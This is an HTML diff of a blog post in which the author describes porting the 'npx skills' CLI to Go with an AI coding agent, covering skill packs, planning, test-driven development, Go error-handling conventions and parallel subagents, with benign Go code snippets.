+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Rust&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; was exceptionally performant, but navigating its borrow checker rules and managing its lifetime annotations added too much friction for our simple symlinking tool.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;If you choose &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;Python&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;, you will have to distribute a runtime interpreter and manage virtual environments, dragging in packaging overhead via &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;pip&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; that we wanted to avoid.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Zig&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; offered excellent low-level memory controls and compiling speed, but it lacked high-level standard library abstractions for HTTP operations and archive extraction out of the box.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Compiled &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;Swift&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; provided clean scripting on macOS, but its cross-platform compilation capabilities for Windows and Linux were less suited for our multi-platform requirements.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;For us, &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;Go&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; struck the right balance: it gave us synchronous, linear code, instant compiling, and a rich standard library.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To ensure I was not doing the same work that someone had already completed before me, I kicked off the project by asking directly:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;I want to port the `npx skills` to go. Did anyone do this before?&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76ba1c0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The agent researched the web and verified that there was no official Go port of the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;vercel-labs/skills&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; repository. It confirmed that while the official CLI is TypeScript-based and distributed via &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;npm&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, the Agent Skills specification itself is open and language-agnostic. This meant we were free to build a compiled Go port from scratch.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;And since I want to learn in the process, I also asked for Go-specific tips, tricks, and traps:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;Identify 3-5 patterns on how to / how NOT to use GO and explain them to me&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76ba940&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Step 1: It's about Skills&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To make best use of best practices in a language that I'm not familiar with, I decided to find the most popular, well-received Agent Skill (instructions that guide AI coding assistants) and install it before we write any code or even start planning. Grounding the environment first ensures that any code written or planned subsequently conforms to the community's consensus style.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Skill search prompt&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;I asked the agent what community agent skills were available for Go:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;what are the top community agent skills for `go`?&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76baee0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Once the agent suggested &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;samber/cc-skills-golang&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, I directed it to install the skill pack:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;add all skills from samber/cc-skills-golang&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76bad60&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Once installed, I manually verified that the skill was discovered and ready by typing &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/golang-&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; to invoke autocompletion.&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Step 2: Gap analysis and planning&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;I initialized the architectural goals by providing the agent with the following instruction:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;Plan 100% functionality port of `npx skills` to Go, focusing on safety, best practices, and with 90% unit test coverage. Pull the repo and map things out. Ask me any questions.&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76ba0d0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Our first topic task was the dynamic onboarding flow. When asked what the default should be, I suggested prompting to install &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;antigravity-cli&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; if no agent is found. I also defined the fallback behavior to the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;universal&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; directory when multiple active agents are detected:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;quot;For the MVP, we target Antigravity 2 support as default and fallback to universal through the standards-compliant &amp;#x27;.agents&amp;#x27; directory (if multiple agents detected).&amp;quot;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76ba4f0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Implementation&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;After I approved the Plan, Antigravity handled the systematic conversion of all 51+ agent configuration records (even though I didn't explicitly ask for all this, the AI correctly identified the task as simple enough to just include in the MVP scope), mapping distinct directories for Aider, Claude Code, Cursor, Zed, and others from TypeScript to Go, ensuring we fully covered all environments.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The core structures are conveniently located in one file &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/src/skl/types.go" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;types.go&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;type AgentType string\r\n\r\ntype AgentConfig struct {\r\n\tName                string\r\n\tDisplayName         string\r\n\tSkillsDir           string\r\n\tGlobalSkillsDir     string\r\n\tShowInUniversalList bool\r\n\tDetectInstalled     func(home, configHome, cwd string) bool\r\n}\r\n\r\n...&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76ba3d0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This mapping works well. For example, the detection logic for Zed handles Linux (Flatpak), macOS, and Windows configurations dynamically in just a few lines:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;&amp;quot;zed&amp;quot;: {\r\n\tName:        &amp;quot;zed&amp;quot;,\r\n\tDisplayName: &amp;quot;Zed&amp;quot;,\r\n\tSkillsDir:   &amp;quot;.agents/skills&amp;quot;,\r\n\tGlobalSkillsDir: filepath.Join(home, &amp;quot;.agents/skills&amp;quot;),\r\n\tDetectInstalled: func(h, c, w string) bool {\r\n\t\treturn exists(filepath.Join(c, &amp;quot;zed&amp;quot;)) ||\r\n\t\t\t(zedAppDataHome != &amp;quot;&amp;quot; &amp;amp;&amp;amp; exists(filepath.Join(zedAppDataHome, &amp;quot;Zed&amp;quot;))) ||\r\n\t\t\t(zedFlatpakConfigHome != &amp;quot;&amp;quot; &amp;amp;&amp;amp; exists(filepath.Join(zedFlatpakConfigHome, &amp;quot;zed&amp;quot;)))\r\n\t},\r\n}&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76baa00&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Next, I noticed that the Antigravity user onboarding code was intermingled with the automated mapping. A default like this one is a personal user choice and is better suited for isolation in its own file: &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/src/skl/agy-onboarding.go" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;agy-onboarding.go&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;move default Antigravity 2 prompting to agy-onboarding.go&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be76bad00&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;With version zero scaffolded, it was time to test.&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Step 3: Enforcing a quality assurance (QA) loop&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To guarantee that the Go port behaved identically to the original TypeScript CLI, we adopted a Test-Driven Development (TDD) loop. I kicked it off with this prompt:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;Apply TDD principles and https://preslav.me/2026/05/19/10-golang-error-handling-commandments/&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9730&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;This initiated the TDD process. Rather than explicitly prompting the agent to use skills, I guided it to fetch the 3rd party best-practice blog post, which reminded the agent about relevant Agent Skills (&lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/.agents/skills/golang-how-to/SKILL.md" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;golang-how-to&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/.agents/skills/golang-testing/SKILL.md" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;golang-testing&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/.agents/skills/golang-error-handling/SKILL.md" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;golang-error-handling&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, and &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/.agents/skills/golang-cli/SKILL.md" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;golang-cli&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;). Because Antigravity has a sandbox, it parsed these skills and automatically started executing the QA loop. And it will keep re-applying these TDD principles in the current trajectory, anytime it is about to change functional code.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Test-first frontmatter parsing&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;For frontmatter parsing, the agent wrote &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/src/skl/frontmatter_test.go" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;frontmatter_test.go&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; first using Go's table-driven test pattern (which was a delightful new pattern for me to discover):&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;func TestParseFrontmatter(t *testing.T) {\r\n\ttests := []struct {\r\n\t\tname        string\r\n\t\traw         string\r\n\t\twantData    map[string]interface{}\r\n\t\twantContent string\r\n\t}{\r\n\t\t{\r\n\t\t\tname:        &amp;quot;valid frontmatter&amp;quot;,\r\n\t\t\traw:         &amp;quot;---\\nname: my-skill\\n---\\n# Content\\n&amp;quot;,\r\n\t\t\twantData:    map[string]interface{}{&amp;quot;name&amp;quot;: &amp;quot;my-skill&amp;quot;},\r\n\t\t\twantContent: &amp;quot;# Content\\n&amp;quot;,\r\n\t\t},\r\n\t}\r\n\tfor _, tt := range tests {\r\n\t\tt.Run(tt.name, func(t *testing.T) {\r\n\t\t\tgotData, gotContent, err := ParseFrontmatter(tt.raw)\r\n\t\t\t# assert results...\r\n\t\t})\r\n\t}\r\n}&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9fd0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;When Antigravity ran &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;go test&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, it failed cleanly as we expected. My agent then generated &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/src/skl/frontmatter.go" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;frontmatter.go&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, implementing a linear string scanning loop that splits the document and unmarshals its YAML metadata. By using simple linear scanning instead of complex regular expressions, we hardened our tool against Regular Expression Denial of Service (ReDoS) vulnerabilities that could crash the application. Including &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;safety&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; as a goal (in my initial prompt) resulted in safer code, even though the original Node implementation was using regular expressions.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Grounding via error commandments&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Since we're talking about error handling, I'll cover here how we aligned our error structures with Preslav Rachev's &lt;/span&gt;&lt;a href="https://preslav.me/2026/05/19/10-golang-error-handling-commandments/" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;10 Golang Error Handling Commandments&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. Go requires you to return error values explicitly rather than catching them as exceptions. By integrating these rules, I directed the agent to check its errors immediately at every level (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;if err != nil&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) and wrap them with contextual detail (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;fmt.Errorf("action: %w", err)&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) before it propagates them up our call stack. While doing a final review of the generated code, I realized Antigravity forgot about this best practice, so I reminded it:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;quot;shorten error messages in all files, remove &amp;#x27;failed to&amp;#x27; prefixes, etc. See the 10 golang commandments&amp;quot;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9a00&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It promptly &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/commit/59822bc69464a5fce961231ef56ac0e775855aeb" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;fixed&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; them across the codebase.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Are unit tests enough?&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The short answer is &lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt;No&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To ensure that the AI did not introduce subtle bugs or hallucinations during the translation process, I performed code reviews rather than blindly trusting passing test suites.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;When I audited the generated tests, I realized that passing green checks alone weren't enough: We were missing tests for that long list of installation locations and the various combinations of having no agents, a single agent, or multiple agents active at the same time. Since this was a complete rewrite, I wanted end-to-end integration coverage for these journeys. To address this gap, I prompted Antigravity with a set of targeted scenarios:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;Add integration tests:\r\n1. no agents installed: verify that it installs to antigravity and outputs the agy-cli onboarding tip.\r\n2. support for all agents but one\r\n3. exactly one agent installed, including cases where the same path might be attributed to multiple agents\r\n4. support for non-parametrized agents&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b91c0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;&lt;strong&gt;Note&lt;/strong&gt;: Non-parameterized agents like Claude Code or Codex define their configuration paths globally when the package loads (or via environment variables) instead of scanning the active workspace folder at runtime.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/commit/02f170e" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;changelist&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; that added these tests didn't touch any production files, the logic was solid. But I didn't want to leave this to luck. If you care about a specific feature or workflow, you have to be explicit about it. Taking five minutes to verify your end-to-end coverage and defining a few solid tests protects your users from experiencing a broken release down the line.&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Step 4: Parallel subagents for CLI commands&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;When you port a full suite of CLI commands (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;init&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;add&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;list&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;remove&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;find&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;update,...&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) along with their sub-options, you face a large surface area. Rather than migrating them sequentially, it might be better to parallelize our work. In our case, it was a good choice because we wanted each subagent to focus on its specific topic rather than keep in mind the entire tool, and this helped spot a few gaps.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;However, subagents are not always the best choice; you should only prioritize parallel execution on voluminous, independent tasks that are clearly bounded. When done right, parallel subagents won't consume significantly more tokens than a single long-running thread, but they protect the main coordinator agent from hitting context compression limits under the weight of a massive codebase. Most simple projects do not require this level of scale. A good rule of thumb is to reserve subagents for workloads equivalent to tens of features with tens of subfeatures.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In previous steps, I ran a single agent to quickly and efficiently build an MVP. But I was not sure whether it fully ported the code. So I asked it directly:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;did you cover 100% of the original CLI? \r\nhave subagents research each option individually and each test and fill in the gaps&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9070&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It turned out this was the right call. The subagents conducted an in-depth audit of the commands, catching several option gaps and missing tests that were subsequently integrated in this &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/commit/b9467b6783bbbadbb4236bbde5f49aab7224bd78" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;audit commit&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: []&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="mermaid_chart" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/mermaid_chart.max-1000x1000.jpg" /&gt;
+        
+        &lt;/a&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Each subagent worked on exactly one command. They analyzed flag permutations like &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;-g/--global&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;--copy&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, drafted table-driven unit tests, and verified their code compiled cleanly. Once they reported back, the main coordinator integrated their changes, resolved any conflicts, and validated that the entire combined project compiled successfully.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;The Elephant and the Goldfish&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To keep our agent focused during this migration, we used the Elephant and Goldfish metaphor, an architectural pattern documented in Google Research's &lt;/span&gt;&lt;a href="https://research.google/pubs/elephants-goldfish-and-the-new-golden-age-of-software-engineering" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Elephants, Goldfish, and the New Golden Age of Software Engineering&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;. This relies on two distinct roles: the Elephant (the long-term coordinator session holding design rules and codebase memory) and the Goldfish (transient, clean subagents that you spawn to run a single task without background history).&lt;/span&gt;&lt;/p&gt;
